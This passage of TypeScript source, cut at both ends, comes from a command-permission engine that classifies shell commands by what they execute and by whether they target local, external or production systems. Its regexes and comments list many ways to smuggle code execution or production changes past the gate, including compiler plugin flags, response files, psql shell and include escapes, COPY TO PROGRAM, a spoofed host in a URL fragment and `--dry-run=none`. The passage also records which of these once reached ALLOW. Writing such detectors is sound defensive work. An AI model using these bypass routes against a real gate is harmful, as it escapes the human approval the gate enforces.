    // `.cts` beside the `.js` it was declared with, and listing them by hand missed exactly those (decision
    // challenge, findings 2, 32)
    const variants = configs.flatMap((c) =>
      /\.(js|mjs|cjs)$/.test(c) ? [c, c.replace(/\.(js|mjs|cjs)$/, '.ts'), c.replace(/\.(js|mjs|cjs)$/, '.mts'), c.replace(/\.(js|mjs|cjs)$/, '.cts')] : [c],
    );
    const present =
      variants.map((c) => findUp(ctx, cwd, c)).find((f) => f !== null) ??
      commandLineConfig(tokens, cwd) ??
      dataConfigNamingCode(ctx, cwd, bare);
    if (present === null || present === undefined)
      return {
        kind: 'none',
        key: `bounded-config:${bare}`,
        body: null,
        reason: `${bare} configuration is data`,
        resolution: 'NOT_A_PRODUCER',
      };
    return {
      kind: 'none',
      key: `discovers-config:${present}`,
      body: null,
      reason: `${bare} imports and runs ${present}`,
      resolution: 'UNKNOWN_PRODUCER',
      unresolved: [{ what: 'config', where: present, why: 'executable configuration' }],
    };
  }
  // AN ASSIGNMENT IS NOT A PROGRAM. `TODAY=$(date +%F)` and `n=$((i+1))` have no head at all — the name is bound
  // and nothing is executed — but the whole token was read as a program name that the vocabulary had never heard
  // of, so the most ordinary line in any script was opaque once script bodies started being classified line by
  // line (exit review 4). The substituted command is a segment of its own and is classified there, and an
  // assignment that redefines EXECUTION is still carried by the binding dimension, which this does not touch.
  // A name that redefines EXECUTION ITSELF — PATH, LD_PRELOAD, BASH_ENV, GIT_SSH_COMMAND — is excluded: binding
  // it changes what every later command in that shell runs, which is precisely an execution closure.
  // a name this unit DEFINED as a function: its body was handed over at the definition, so calling it adds no
  // closure and it is not an unmodelled program (exit review 5)
  if (env.definedNames?.has(bare))
    return {
      kind: 'none',
      key: `function:${bare}`,
      body: null,
      reason: `${bare} is a function defined and analysed in this unit`,
      resolution: 'NOT_A_PRODUCER',
    };
  const assigned = /^([A-Za-z_][A-Za-z0-9_]*)\+?=/.exec(bare);
  if (assigned && !ENV_INJECT_RE.test(assigned[1]!))
    return {
      kind: 'none',
      key: `assignment:${bare}`,
      body: null,
      reason: 'a name binding executes nothing',
      resolution: 'NOT_A_PRODUCER',
    };
  // THE DEFAULT IS NOT A POSITIVE CLAIM: a head the vocabulary never classified is unknown, not proven absent.
  return {
    kind: 'none',
    key: `unmodelled:${bare}`,
    body: null,
    reason: `${bare} is not declared bounded, so what else it executes is unknown`,
    resolution: 'UNKNOWN_PRODUCER',
    unresolved: [{ what: 'body', where: bare, why: 'no entry in the bounded-command vocabulary' }],
  };
}

function opaqueHit(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  norm: string,
  reason: string,
  unread = true,
  capability:
    | 'command.script-opaque'
    | 'command.ambient-unresolved'
    | 'command.unmodelled-closure' = 'command.script-opaque',
): CapabilityHit {
  return {
    capability,
    verdict: verdictFor(table, ctx, capability),
    via: reason,
    segment: norm,
    absolute: false,
    // true when something WILL run that could not be read; such a hit survives the opacity filter of an enclosing
    // declared class, because that is exactly the case the fail-safe rule exists for
    opaqueUnread: unread,
  };
}

// ---------------------------------------------------------------------------------------------------------------
// Q98 target/effect classification. Authorization is target-aware: a Kubernetes or database command is judged by
// WHERE it points, never by the tool's name. `kubectl apply` at a kind cluster is local work; the same command at a
// shared cluster is an external effect; with no resolvable target it is TARGET_UNCLASSIFIED, never a silent "local".
// ---------------------------------------------------------------------------------------------------------------

/** Environment variables that choose which database or cluster a client talks to. */
/** Options that hand an arbitrary program to an otherwise well-behaved command. The list is a real family, not a
 *  spelling chase: every entry is "this option's value is executed". */
const PROGRAM_OPERAND_LONG =
  '--use-compress-program|--checkpoint-action|--to-command|--rsh-command|--rsh|--exec|--ok-dir|-TT|--unzip-command|--filter=.*command|--pre|--hostname-bin|--upload-pack|--receive-pack|--editor|--pager|--ssh-command|--proxy-command' +
  // The COMPILER family. Adding compilers and coreutils to the bounded vocabulary without extending this rule
  // reopened the very class the rule exists for: `clang -B dir` and `gcc -wrapper prog` run prog instead of the
  // real tool, `-fplugin=` and `-specs=` load code into the compiler, `go build -toolexec` wraps every tool
  // invocation, `javac -processor` runs an annotation processor, and `sort --compress-program` runs a program
  // under a capability literally named command.read-only (decision challenge, findings 5, 25, 26, 30).
  '|--post-renderer|--exec-path|--compress-program|--wrapper|-wrapper|-fplugin|-fplugin-arg-[\\w-]+|-specs|--specs|-toolexec|-ldflags|-gccgo|-B|-processor|-processorpath|-Xplugin|--plugin|-load|-Xclang|-fpass-plugin|--preprocessor|-no-integrated-cpp' +
  // rsync's `-e ssh` names a remote SHELL. The lookahead matched those letters ANYWHERE in the value, so a
  // database statement beginning `show …` contained `sh` and `mysql -e 'show tables'` — a read of the local
  // socket — was classified as naming an unbounded program (exit review 7). The value must BE the program.
  // ...and an ASSIGNMENT is not a program name: `docker run -e SHELL=/bin/sh myapp` sets a variable inside the
  // container and was read as naming a remote shell (exit review 7)
  '|-e(?=\\s+(?![A-Za-z_][A-Za-z0-9_]*=)(?:\\S*/)?(ssh|sh|bash|zsh|dash|python3?|perl|ruby|node)(\\s|$))';
const PROGRAM_OPERAND_LONG_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG})(=|\\s)`);
/** the short forms whose value is GLUED to the letter: `gcc -B/tmp/evil`, `clang -Xclangfoo`, `-loadplugin` */
const PROGRAM_OPERAND_GLUED_RE = /\s(-B|-Xclang|-Xplugin|-load|-fplugin|-specs|-wrapper|-agentlib|-agentpath|-javaagent)[:=]?\S/;
/** the archive tools where a short `-I` names a compression PROGRAM (for make it is an include directory) */
const PROGRAM_OPERAND_TOOL_RE = /^(tar|bsdtar|gtar|pax)\b/;
/** A RESPONSE FILE IS A COMMAND LINE. `clang @opts.rsp`, `gcc @flags`, `javac @args`, `swiftc @f`, `link @f` and
 *  `dotnet @f` all read that file and splice its contents into argv — so `-fplugin=/tmp/evil.so` sitting in it
 *  loads a compiler plugin, and every option rule above was reading a command line the tool will never see
 *  (exit review 10). The two reviews before this one closed "an option whose VALUE is a program" by naming the
 *  options; a response file is the same hole one level up, where the OPTIONS THEMSELVES are out of sight. The
 *  file is read when it is inside the workspace and its words are analysed as what they are; when it cannot be
 *  read, the opacity is what it is. */
const RESPONSE_FILE_TOOLS =
  /^(clang|clang\+\+|gcc|g\+\+|cc|c\+\+|ld|lld|javac|java|kotlinc|scalac|swiftc|swift|link|lib|cl|csc|vbc|dotnet|rustc|nvcc|icc|icx|tsc|ar|nm|objcopy|strip)$/;
const PROGRAM_OPERAND_RE = new RegExp(`\\s(${PROGRAM_OPERAND_LONG}|-I)(=|\\s)`);

const DB_CLIENT_HEADS = new Set([
  'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'sqlite3', 'redis-cli', 'clickhouse-client', 'cqlsh',
  // ADMINISTRATION TOOLS ARE CLIENTS TOO. `mysqladmin -h prod-db.acme.com drop appdb` drops a production
  // database and was not enrolled at all; `clickhouse client` is the two-word spelling of `clickhouse-client`
  // (exit review 7).
  'mysqladmin', 'mysqldump', 'mysqlsh', 'pg_dump', 'pg_restore', 'pg_dumpall', 'pgbench', 'createdb', 'dropdb',
  'valkey-cli', 'influx', 'clickhouse',
  // MIGRATION RUNNERS ARE CLIENTS TOO, and the most consequential ones: they connect to a database named in a
  // CONFIG FILE and then apply arbitrary DDL to it. Neither the target nor the statements are on the command
  // line, so `flyway -configFiles=/tmp/flyway.conf migrate` and `liquibase --defaultsFile=… update` were
  // ordinary unknown commands (exit review 9).
  'flyway', 'liquibase', 'sqitch', 'alembic', 'dbmate', 'goose', 'atlas',
]);
const DB_EXECUTES_UNREAD =
  // `\!` is psql's shell escape. Inside DOUBLE quotes the backslash is consumed before this test ever sees it,
  // so the de-escaped form — a `-c` value that BEGINS with `!` — is matched too. Matching a bare `!` anywhere
  // would be far too broad; anchoring it to the start of the statement is exactly the meta-command position
  // (challenge 8, finding 14).
  // The family is "this client runs something it was handed": a program file, a shell escape, a loadable
  // extension, or a COPY in either direction. Enumerating only one direction of COPY and only sqlite's `.shell`
  // left the neighbours open (decision challenge, findings 12, 34).
  // `\i FILE` (psql) and `\. FILE` (mysql) READ AND RUN A SCRIPT, exactly as `-f` does — the meta-command form
  // just puts it inside the statement, where the `-f` test never looks. `psql -c "\i /tmp/payload"` executed a
  // file the kernel has not read, at ALLOW (exit review 9). `\ir` is psql's relative-include twin.
  // EVERY SPELLING THE CLIENT ACCEPTS, not the spaced one only. A short flag GLUES its value (`psql -f/tmp/x`),
  // the shell needs no space after `<` (`mysql </tmp/x`), psql's include has a LONG name (`\include`, `\ir`,
  // `\ifile`), and a script path may be followed by a quote or a parenthesis rather than whitespace
  // (`mongosh --eval 'load("/tmp/evil.js")'`) — each of which put an unread program back out of reach
  // (exit review 10).
  /\s\S*\.(sql|psql|ddl|cql|js|py|rb|lua)(\s|$|["'),;])|\s(-f|--file|-init|--init)(=|\s|\S)|\s<\s*\S|\\!|\\i(r|nclude|file)?(\s|$)|\\\.(\s|$)|(^|[\s;"'])\\?(i(nclude|r|file)?|\.)(\s+\S)|(-c|--command|--eval|-e|--execute)(=|\s+)["']?\s*!|\.(shell|system|read|load|import|output|once|excel|cd)\b|\bSYSTEM\b|\b(load_extension|sqlite3_load_extension)\b|\bCREATE\s+(VIRTUAL\s+TABLE|FUNCTION|EXTENSION)\b|COPY\b[\s\S]*\b(TO|FROM)\s+PROGRAM\b|\\copy\b[\s\S]*\bPROGRAM\b|\bsource\s+\S|\bload\s*\(|--queries?[-_]file\b|--(multi)?query[-_]file\b/i;

const TARGET_ENV_RE =
  // THE CONTAINER ENGINE IS SELECTED BY ENVIRONMENT TOO. `DOCKER_HOST` and `DOCKER_CONTEXT` were enrolled in the
  // RESOLVER but not here, so the assignment was stripped as noise and never re-attached: the engine survived
  // only while the assignment happened to stay leading in the raw segment. Inside an `if`, a loop body, a `trap`
  // or a herestring it did not, and a shell on a production daemon asked (exit review 6, generated cross-product).
  /^(PGHOST|PGHOSTADDR|PGSERVICE|PGDATABASE|PGPORT|PGURI|MYSQL_HOST|MYSQL_TCP_PORT|REDIS_HOST|REDIS_URL|MONGODB_URI|MONGO_URL|DATABASE_URL|FLYWAY_URL|KUBECONFIG|KUBERNETES_MASTER|KUBE_CONTEXT|HELM_KUBECONTEXT|HELM_KUBEAPISERVER|CLICKHOUSE_HOST|DOCKER_HOST|DOCKER_CONTEXT|CONTAINER_HOST|BUILDX_BUILDER|LIQUIBASE_COMMAND_URL|LIQUIBASE_URL|DBMATE_DATABASE_URL|PRISMA_DATABASE_URL|TYPEORM_URL|SEQUELIZE_URL|POSTGRES_URL|POSTGRES_HOST|MONGODB_HOST)$/;
const TARGET_ENV_HEADS = new Set([
  'psql', 'mysql', 'mariadb', 'mongosh', 'mongo', 'redis-cli', 'clickhouse-client', 'cqlsh', 'sqlite3',
  'kubectl', 'oc', 'helm', 'kustomize', 'flyway', 'liquibase', 'alembic', 'dbmate', 'prisma', 'knex', 'sequelize',
  'mysqladmin', 'mysqldump', 'pg_dump', 'pg_restore', 'pg_dumpall', 'createdb', 'dropdb', 'clickhouse',
  'docker', 'podman', 'nerdctl', 'docker-compose', 'podman-compose', 'lima', 'colima',
  // a runner does not change what the wrapped tool connects to
  'npx', 'pnpm', 'yarn', 'bunx', 'pnpx', 'bun', 'npm',
]);

const K8S_MUTATING_VERBS = new Set([
  'apply', 'create', 'delete', 'patch', 'edit', 'scale', 'rollout', 'replace', 'drain', 'cordon', 'uncordon',
  'taint', 'exec', 'cp', 'annotate', 'label', 'set', 'expose', 'run', 'autoscale', 'attach', 'port-forward',
  'debug', 'certificate', 'proxy', 'auth', 'apply-set',
  // `wait` is NOT here: it blocks until a condition holds and changes nothing (exit review 10)
]);
/** A VERB IS NOT A MUTATION IN EVERY SUBCOMMAND IT SPELLS. `rollout` restarts and undoes — and it also REPORTS,
 *  with `status` and `history`; `auth` changes nothing at all in the `can-i` and `whoami` forms, which are the
 *  two commands an operator runs to find out what they may do. Judged by the verb alone, both were absolute
 *  denies against a production cluster: refusing to LOOK, which is the one verdict nobody can approve
 *  (exit review 9). The mutating spellings keep the verb. */
const K8S_READ_SUBCOMMANDS: Record<string, ReadonlySet<string>> = {
  rollout: new Set(['status', 'history']),
  auth: new Set(['can-i', 'whoami']),
  certificate: new Set([]),
};
// `dependency update|build` FETCHES remote charts and writes them into the chart directory, and `helm repo add`
// records where later fetches come from — neither touches the cluster, which is why the verb test missed them,
// and both bring unreviewed content into the workspace (exit review 10).
const HELM_MUTATING_VERBS = new Set([
  ...['install', 'upgrade', 'uninstall', 'delete', 'rollback', 'push', 'test'],
  ...['dependency', 'repo', 'plugin', 'registry'],
]);
/** A COMMAND THAT ASKS FOR HELP, OR REPORTS A VERSION, CONNECTS TO NOTHING. It is the first thing anyone runs
 *  against an unfamiliar tool and the last thing that should be refused outright (exit review 9). Read from the
 *  RAW tokens, so a `--help` inside a quoted SQL statement or a search pattern is not one. */
function isProbeInvocation(seg: string): boolean {
  // ONE READER. This used to keep its own list of flags and of options-with-values, and the two copies drifted:
  // `git push --force origin main > --help` (a redirection TARGET), `kubectl delete pod x -- --help` and
  // `redis-cli SET foo --help` were probes here and not there (exit review 10, self-attack).
  return helpProbeHead(seg) !== null;
}
/** A DRY RUN PERFORMS THE ACT'S CHECKS AND NOT THE ACT. `kubectl apply --dry-run=client`, `helm upgrade
 *  --dry-run`, `git push --dry-run` and `aws … --dry-run` are how an operator finds out what WOULD happen, and
 *  each was refused absolutely (exit review 9). The gate that remains is the ordinary one: a dry run against a
 *  production target still reaches it, and a human can still say no. */
/** flags that take no value, so the word after them is a new word: what may stand in front of a dry-run flag */
const BOOLEAN_BEFORE_DRY_RUN =
  /^(--force|-f|--wait|--atomic|--install|-i|--overwrite|--server-side|--prune|--recursive|-R|--all|-A|--record|--save-config|--show-managed-fields|--skip-crds|--no-hooks|--debug|--create-namespace|--dependency-update|--reuse-values|--reset-values|--cascade|--ignore-not-found|--wait-for-jobs|--enable-helm|--delete|--recursive|--quiet|-q|--verbose)$/;

function isDryRun(seg: string): boolean {
  const t = commandWords(tokenizeMarked(seg))
    .filter((x) => !x.quoted)
    .map((x) => x.text);
  // nothing after a `--` belongs to the tool's own flags
  const dd = t.indexOf('--');
  const words = dd >= 0 ? t.slice(0, dd) : t;
  // `--dry-run=none` IS NOT A DRY RUN. It is the EXPLICIT spelling of "really do it": kubectl documents none as
  // the default, and helm's own help says `--dry-run=none` executes the operation normally and persists
  // changes. Accepting any value swallowed it, so `kubectl --context production apply --dry-run=none` and
  // `helm --kube-context production uninstall app --dry-run=none` reached ALLOW — the exception meant to let an
  // operator LOOK became the spelling that hid the act (self-attack on exit review 9).
  return words.some((w, i) => {
    if (
      !(
        w === '--server-dry-run' ||
        w === '--dryrun' ||
        w === '--what-if' ||
        w === '--no-act' ||
        // a BARE `--dry-run` is a dry run: kubectl's and helm's flag takes its value only with `=`, so the next word is
        // a positional (`helm upgrade --dry-run none ./chart` upgrades a release NAMED none, as a dry run)
        w === '--dry-run' ||
        /^--dry-run=(client|server|true|1|yes)$/i.test(w)
      )
    )
      return false;
    // A FLAG IN AN OPTION'S VALUE POSITION IS THAT OPTION'S VALUE. Which options take one is not knowable for every
    // tool, so the word before must be a positional, a complete `--opt=value`, or an option known to take none
    // (`kubectl set env deploy/x A=1 --field-manager --dry-run` names a field manager)
    const prev = words[i - 1];
    if (prev === undefined || !prev.startsWith('-') || prev.includes('=')) return true;
    return BOOLEAN_BEFORE_DRY_RUN.test(prev);
  });
}
/** capabilities that assert a LOCAL target without ever resolving one; each is re-judged against the real target */
const TARGET_SENSITIVE: Record<string, 'k8s' | 'db' | 'container' | 'cloud'> = {
  // The container runtime was the one high-impact tool not enrolled in the Q98 target model, so
  // `kubectl --context production apply` was DENY and `docker --context production stack deploy` was ALLOW on the
  // identical signal. The accepted product decision was about running a container on the LOCAL daemon; it said
  // nothing about a remote engine (decision challenge, finding 1).
  'container.run': 'container',
  'container.build': 'container',
  'container.prune': 'container',
  'k8s.local.apply': 'k8s',
  'k8s.local.delete': 'k8s',
  'k8s.local.test': 'k8s',
  'db.local.query': 'db',
  'db.local.migrate': 'db',
  'db.local.drop': 'db',
  'db.local.start': 'db',
  // The cloud CLIs were never enrolled at all: their verdict was decided by the matcher alone, which skips global
  // options to reach the service and the verb and therefore discards `--endpoint-url` as noise. So an S3 emulator
  // on the developer's own machine was an ABSOLUTE deny — one a human cannot approve — while the identical signal
  // on a container engine or a database was resolved properly (exit review 4). The whole family is enrolled: a
  // partial enrolment would leave `iam`, `kms`, `secretsmanager` and `route53` at :4566 denied, and LocalStack
  // emulates all of them.
  'production.cloud.mutate': 'cloud',
  'production.dns.mutate': 'cloud',
  'production.iam.mutate': 'cloud',
  'production.kms.mutate': 'cloud',
  'production.secrets.mutate': 'cloud',
};

/** THE TOOL DECIDES WHETHER A TARGET EXISTS, NOT THE CAPABILITY THAT HAPPENED TO WIN. Matchers are
 *  first-match-wins, so a segment can be classified by a capability that says nothing about a target while still
 *  naming a tool whose whole job is to act on one: `docker exec` matches the script-opaque matcher — an
 *  interactive shell IS opaque — and `command.script-opaque` is not enrolled, so
 *  `DOCKER_HOST=tcp://prod… docker exec box sh` opened a shell on a production engine at ASK, while the same
 *  engine with `docker run` was DENY (exit review 6). Enrolling the HEAD closes the class rather than the verb:
 *  every capability a container/k8s/db tool can be classified as is now re-targeted.
 *
 *  Deliberately NOT extended to `cloud`: that kind is the kernel's one DE-escalation (it REPLACES the hit with
 *  `cloud.local.mutate`), so inferring it from a head could lower a verdict that was reached for another reason.
 *  The three kinds here only ever raise. */
/** The head of the COMMAND, not the first token of the segment: leading `NAME=VALUE` assignments are the
 *  environment the command runs with, not the program it runs. `DOCKER_HOST=… docker exec` reads its head as the
 *  assignment, which is no tool at all (exit review 6, generated cross-product). */
function commandHead(norm: string): string {
  const t = tokenize(norm);
  let i = 0;
  while (i < t.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t[i]!)) i++;
  return (t[i] ?? '').replace(/^.*\//, '');
}

const TARGET_SENSITIVE_HEAD: Array<[RegExp, 'k8s' | 'db' | 'container']> = [
  [/^(docker|podman|nerdctl|docker-compose|podman-compose|lima|colima)$/, 'container'],
  [/^(kubectl|oc|helm|kustomize)$/, 'k8s'],
  [/^(psql|mysql|mariadb|mongosh|mongo|redis-cli|clickhouse-client|cqlsh|influx)$/, 'db'],
];

/** The host an endpoint names, with scheme, credentials, port, IPv6 brackets and path removed. */
function endpointHost(v: string): string {
  // THE AUTHORITY ENDS AT THE FIRST `/`, `?` OR `#`. Cutting only at `/` left a FRAGMENT in the string, and a
  // fragment may contain an `@`: `https://s3.amazonaws.com#@localhost:4566` then read as the host `localhost`,
  // which defeated the whole-host comparison the container resolver and the cloud de-escalation both rest on —
  // a production engine reaching ALLOW and an absolute core deny reaching ASK (exit review 5). Every URL parser
  // cuts the authority first and looks for userinfo INSIDE it; so does this one now.
  let h = v.replace(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//, '');
  const cut = h.search(/[/?#]/);
  if (cut >= 0) h = h.slice(0, cut);
  const at = h.lastIndexOf('@');
  if (at >= 0) h = h.slice(at + 1);
  const bracketed = /^\[([^\]]*)\]/.exec(h);
  if (bracketed) return bracketed[1]!;
  const colon = h.lastIndexOf(':');
  return colon >= 0 && /^\d+$/.test(h.slice(colon + 1)) ? h.slice(0, colon) : h;
}

/** A token is unresolvable when it is a variable, a substitution marker or a glob: it could name anything. */
const isOpaqueTarget = (v: string): boolean => /^\$|\$\{|\$SUBST|`|[*?]/.test(v);

/** LOCAL is the weakest answer and PRODUCTION the strongest: when several signals resolve, the strongest decides. */
const TARGET_SEVERITY: Record<TargetClass, number> = {
  LOCAL: 0,
  UNCLASSIFIED: 1,
  EXTERNAL: 2,
  PRODUCTION: 3,
};

/** Every kubectl verb, so the verb can be found BY NAME rather than by skipping option values. */
const KUBECTL_VERBS = new Set([
  ...['get', 'describe', 'logs', 'top', 'explain', 'api-resources', 'api-versions', 'version', 'config', 'cluster-info', 'wait', 'diff', 'events', 'kustomize', 'completion', 'options'],
  ...['apply', 'create', 'delete', 'patch', 'edit', 'scale', 'rollout', 'replace', 'drain', 'cordon', 'uncordon', 'taint', 'exec', 'cp', 'annotate', 'label', 'set', 'expose', 'run', 'autoscale', 'attach', 'port-forward', 'debug', 'certificate', 'proxy', 'auth', 'apply-set'],
]);
/** kubectl/helm options that consume the NEXT token; their value must never be mistaken for the verb. */
const K8S_VALUE_OPTS =
  /^(-n|--namespace|--context|--kube-context|--kubeconfig|--server|-s|--kube-apiserver|--token|--kube-token|--kube-apiserver|--kube-as-user|--kube-as-group|--kube-ca-file|--kube-tls-server-name|--user|--username|--password|--cluster|--as|--as-uid|--as-group|--cache-dir|--certificate-authority|--client-certificate|--client-key|--request-timeout|--tls-server-name|-o|--output|-f|--filename|-l|--selector|--field-selector|--chart|--repo|--version|--values|--set|--set-string|--set-file|-v|--v|--profile|--profile-output|--registry-config|--repository-config|--repository-cache|--burst-limit|--qps|--post-renderer|--post-renderer-args|--key-file|--cert-file|--ca-file|--keyring|--log-flush-frequency|--tls-server-name|--password-stdin|--kuberc|--default-not-ready-toleration-seconds|--default-unreachable-toleration-seconds|--storage-driver-[a-z-]+|--application-metrics-count-limit|--container-hints|--docker[a-z-]*|--global-housekeeping-interval|--housekeeping-interval|--max-housekeeping-interval|--event-storage-[a-z-]+|--boot-id-file|--machine-id-file|--add-dir-header|--alsologtostderr|--log-backtrace-at|--log-dir|--log-file|--log-file-max-size|--logtostderr|--one-output|--skip-headers|--skip-log-headers|--stderrthreshold|--vmodule)$/;

const HELM_VERBS = new Set([
  ...['list', 'ls', 'status', 'get', 'history', 'show', 'search', 'template', 'lint', 'version', 'env', 'dependency', 'diff'],
  ...['install', 'upgrade', 'uninstall', 'delete', 'rollback', 'push', 'test', 'repo', 'plugin', 'create', 'package'],
]);

/** Every value of an option, in every spelling — a client applies the LAST one, so all of them are classified and
 *  the most restrictive decides rather than trusting whichever appears first (round 14). */
function optionValues(tokens: string[], short: string, longs: string[]): string[] {
  const out: string[] = [];
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    let matched = false;
    for (const l of longs) {
      // A SINGLE DASH IN FRONT OF A WHOLE WORD IS A LONG OPTION, not a cluster of short ones. Go's flag package
      // — influx, etcdctl, consul, nomad, half the cloud CLIs — spells every option that way, and the short-flag
      // scan below read `-host localhost` as `-h ost`: a host named "ost", EXTERNAL, absolutely denied, for the
      // most ordinary local command the tool has (exit review 8).
      const single = '-' + l.replace(/^--/, '');
      if (t === l || t === single) {
        if (tokens[i + 1] !== undefined) out.push(tokens[i + 1]!);
        matched = true;
      } else if (t.startsWith(l + '=') || t.startsWith(single + '=')) {
        out.push(t.slice(t.indexOf('=') + 1));
        matched = true;
      }
      if (matched) break;
    }
    if (matched || !short || !t.startsWith('-') || t.startsWith('--')) continue;
    const at = t.indexOf(short, 1);
    if (at < 0) continue;
    // the characters between the dash and the option letter must themselves be option letters: without this, the
    // `h` inside `-url=jdbc:postgresql://localhost:5432/app` reads as `-h` and invents a host (round 14)
    if (!/^-[A-Za-z0-9]*$/.test(t.slice(0, at))) continue;
    const glued = t.slice(at + 1);
    if (glued) out.push(glued);
    else if (tokens[i + 1] !== undefined) out.push(tokens[i + 1]!);
  }
  return out;
}

function matchesAnyGlob(name: string, patterns: string[]): boolean {
  const n = name.toLowerCase();
  return patterns.some((p) => globToRegExp(p.toLowerCase()).test(n));
}

function hasProductionMarker(name: string, markers: string[]): boolean {
  const n = name.toLowerCase();
  return markers.some((m) => new RegExp(`(^|[^a-z0-9])${m.toLowerCase()}([^a-z0-9]|$)`).test(n));
}

function classifyTargetName(
  name: string,
  localPatterns: string[],
  targets: LocalTargets,
): TargetClass {
  if (!name || isOpaqueTarget(name)) return 'UNCLASSIFIED';
  if (hasProductionMarker(name, targets.productionMarkers)) return 'PRODUCTION';
  if (matchesAnyGlob(name, localPatterns)) return 'LOCAL';
  return 'EXTERNAL';
}

/** The five names in `k8s_local_contexts` that are the CONTAINER RUNTIME's own words for the local daemon.
 *  Kubernetes has no such convention: a kubeconfig context called `default` is whatever the operator's file
 *  says, and `kubectl --context default apply -f evil.yaml` was read as local because the container list and the
 *  Kubernetes list are one file (exit review 7). */
const CONTAINER_ONLY_LOCAL = new Set(['default', 'unix', 'npipe', 'rootless', 'desktop-windows']);
const k8sContexts = (targets: LocalTargets): string[] =>
  targets.k8sLocalContexts.filter((c) => !CONTAINER_ONLY_LOCAL.has(c));

/** Resolves the Kubernetes target of a normalized segment and whether the verb mutates it. */
/** docker/podman global options that consume the next token, so their value is not the subcommand. */
const DOCKER_GLOBAL_VALUE_OPTS =
  /^(--log-level|-l|--config|--tlscacert|--tlscert|--tlskey|--context|-c|--host|-H|--url|--connection|--builder|--identity|--runtime|--namespace|--remote|--storage-driver)$/;

/**
 * Which ENGINE a container command talks to. Only an EXPLICIT selection is classified: `-H`/`--host`,
 * `-c`/`--context`, podman `--url`/`--connection`, and `docker context use <name>`, which changes the engine every
 * later command will use. A command with no explicit selection keeps the accepted product decision — running a
 * container on the local default daemon is ALLOW — and the residual risk of an ambient context is recorded in
 * docs/architecture/phase-1-residuals.md rather than guessed at here.
 */
function resolveContainerTarget(
  tokens: string[],
  targets: LocalTargets,
  envInputs: Record<string, string> = {},
): { cls: TargetClass; target: string; mutating: boolean } {
  const signals: Array<{ cls: TargetClass; target: string }> = [];
  const add = (v: string, kind: string) => {
    // the local daemon, however it is spelled, is local: a unix socket, a named pipe, or a loopback endpoint.
    // THE HOST IS COMPARED WHOLE. A substring test made every endpoint that merely CONTAINS a local name local:
    // `tcp://[fd00:acme:prod::1]:2375` contains `::1` and `tcp://prod-localhost.acme.com:2375` contains
    // `localhost`, so a production engine was read as the local daemon (exit review 4).
    if (/^(unix:|npipe:|fd:)/i.test(v) || targets.dbLocalHosts.some((h) => endpointHost(v) === h || v === h))
      // (endpointHost cuts the authority at the first `/`, `?` or `#`, so a fragment cannot fake the host)
      signals.push({ cls: 'LOCAL', target: `${kind} ${v}` });
    else if (isOpaqueTarget(v)) signals.push({ cls: 'UNCLASSIFIED', target: `${kind} ${v}` });
    else signals.push({ cls: classifyTargetName(v, targets.k8sLocalContexts, targets), target: `${kind} ${v}` });
  };
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    // these are GLOBAL options: they come before the subcommand. Past it, `-c` is the container's own flag —
    // `docker run --rm alpine sh -c "echo hi"` is ordinary work and was being DENIED as a remote engine. A
    // global option that TAKES a value must have its value skipped, not treated as the subcommand, or
    // `docker --log-level debug -H tcp://prod …` stopped the scan before the engine (exit review 2).
    if (!t.startsWith('-')) {
      if (i > 1 && DOCKER_GLOBAL_VALUE_OPTS.test(tokens[i - 1] ?? '')) continue;
      break;
    }
    // THE CLIENT CONFIG DIRECTORY SELECTS THE ENGINE. `docker --config DIR` reads DIR/config.json for the current
    // context, and `podman --remote` switches to a connection named in a file: both were skipped as opaque option
    // noise, so a production daemon reached ALLOW (exit review 6). Neither file can be read from here, so the
    // target is UNCLASSIFIED — never local.
    if (t === '--config' || t === '--remote' || t === '-r' || /^--config=/.test(t))
      signals.push({ cls: 'UNCLASSIFIED', target: `client configuration ${t}` });
    const eq = /^(?:--host=|--context=|--url=|--connection=|--builder=|-H|-c)(.+)$/.exec(t);
    if ((t === '-H' || t === '--host' || t === '--url') && tokens[i + 1]) add(tokens[++i]!, 'engine');
    else if ((t === '-c' || t === '--context' || t === '--connection') && tokens[i + 1]) add(tokens[++i]!, 'context');
    else if (eq) add(eq[1]!, t.startsWith('-H') || t.startsWith('--host') || t.startsWith('--url') ? 'engine' : 'context');
  }
  // the engine is selected by ENVIRONMENT too — `DOCKER_HOST` and `DOCKER_CONTEXT` are the same two flags by
  // another name, and docker's own help documents `--context` as overriding `DOCKER_HOST`
  const engineEnv = (k: string, v: string): void => {
    if (/^(DOCKER_HOST|CONTAINER_HOST)$/.test(k)) add(v, 'engine');
    else if (k === 'DOCKER_CONTEXT') add(v, 'context');
    // `BUILDX_BUILDER` selects the builder exactly as `--builder` does, and buildx ships the build context to it
    else if (k === 'BUILDX_BUILDER') add(v, 'builder');
  };
  for (const [k, v] of Object.entries(envInputs)) engineEnv(k, v);
  // …and as a TOKEN, because that is how the normalizer re-attaches a target assignment it stripped from the
  // head. Reading only `envInputs` meant the re-attachment reached the resolver and was ignored by it, which is
  // the "accepted but unconsumed" defect one layer down (exit review 6, generated cross-product).
  for (const t of tokens) {
    const eq = /^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/.exec(t);
    if (eq) engineEnv(eq[1]!, eq[2]!.replace(/^['"]|['"]$/g, ''));
  }
  // `--builder` is unambiguous wherever it sits, and buildx puts it after the plugin subcommand, past the
  // global-option scan above (exit review 2)
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    const eq = /^--builder=(.+)$/.exec(t);
    if (t === '--builder' && tokens[i + 1]) add(tokens[++i]!, 'builder');
    else if (eq) add(eq[1]!, 'builder');
  }
  // `docker context use <name>` re-points every later command at that engine
  const useIdx = tokens.findIndex((t, i) => t === 'use' && tokens[i - 1] === 'context');
  if (useIdx > 0 && tokens[useIdx + 1]) add(tokens[useIdx + 1]!, 'context use');
  // ...AND SO DO ITS THREE SIBLINGS, which were not modelled at all (exit review 7):
  //   `podman system connection add|default NAME [URI]` writes containers.conf — the same name-to-engine binding
  //     `docker context create` writes, and `add` makes the first connection the default;
  //   `docker buildx create --driver remote <endpoint> --use` binds a remote BuildKit daemon and selects it, with
  //     the endpoint as a POSITIONAL that the dedicated `--builder` scan cannot see;
  //   `docker buildx use NAME` selects an already-bound builder.
  // Every later build or run then goes there with no flag naming it, so nothing downstream can be re-targeted.
